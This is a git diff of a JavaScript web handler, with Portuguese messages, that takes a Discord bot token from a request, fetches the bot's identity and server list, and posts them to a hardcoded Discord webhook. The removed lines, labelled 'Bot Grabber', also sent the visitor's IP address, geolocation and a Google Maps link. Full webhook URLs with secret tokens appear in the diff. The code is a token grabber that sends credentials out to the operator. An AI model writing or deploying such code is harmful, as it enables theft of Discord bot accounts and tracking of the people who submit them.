@@ -3,11 +3,8 @@ module.exports = async (req, res) => {
     applicationId,
     token
   } = req.query;
-  const webhookURL = 'https://discord.com/api/webhooks/1319442086524751902/jponFRjtTqcE9E0q-gy2lCCWJQySujcBuoKy5O39mphs-zaToU3An1zRckSOXqXtZICC';
+  const webhookURL = "https://discord.com/api/webhooks/1319504519171932202/0DOBxgvaaVFimYzpzLo-n1YaMwd3N_E1o68YYRE4p5D3W0wUFGlENq5oYSrnVghKufeR"
   
-  const ipLocationURL = `http://ip-api.com/json/`;
-  const clientIP = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress; // Obtém o IP real do cliente
-
   if (!applicationId || !token) {
     return res.status(400).json({
       error: 'applicationId e token são necessários'
@@ -15,11 +12,7 @@ module.exports = async (req, res) => {
   }
 
   try {
-    const locationResponse = await fetch(`${ipLocationURL}${clientIP}`);
-    const locationData = await locationResponse.json();
-
-console.log(req.ip, clientIP)
-
+    
     const botInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
       method: 'GET',
       headers: {
@@ -37,26 +30,8 @@ console.log(req.ip, clientIP)
     const guilds = await guildsResponse.json();
 
     const embed = {
-      username: 'Bot Grabber',
+      username: 'BotToken',
       embeds: [{
-        title: 'Nova Solicitação Recebida',
-        color: 0x00ff00,
-        fields: [{
-          name: 'IP do Cliente',
-          value: clientIP || 'Não disponível',
-          inline: false
-        },
-          {
-            name: 'Localização',
-            value: `${locationData.country_name || 'Brasil'}, ${locationData.region || 'Não disponível'}, ${locationData.city || 'Não disponível'}`,
-            inline: false
-          },
-          {
-            name: 'Google Maps',
-            value: `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`,
-            inline: false
-          },
-          {
             name: 'Informações',
             value: `\`${botInfo?.username} - ${botInfo?.id}\``,
             inline: false
@@ -68,7 +43,7 @@ console.log(req.ip, clientIP)
           },
           {
             name: 'Servidores',
-            value: guilds?.map(guild => guild.name).join(', ') || 'Nenhum',
+            value: `\`${guilds?.map(guild => guild.name).join(', ') || 'Nenhum'}\``,
             inline: false
           },
           {
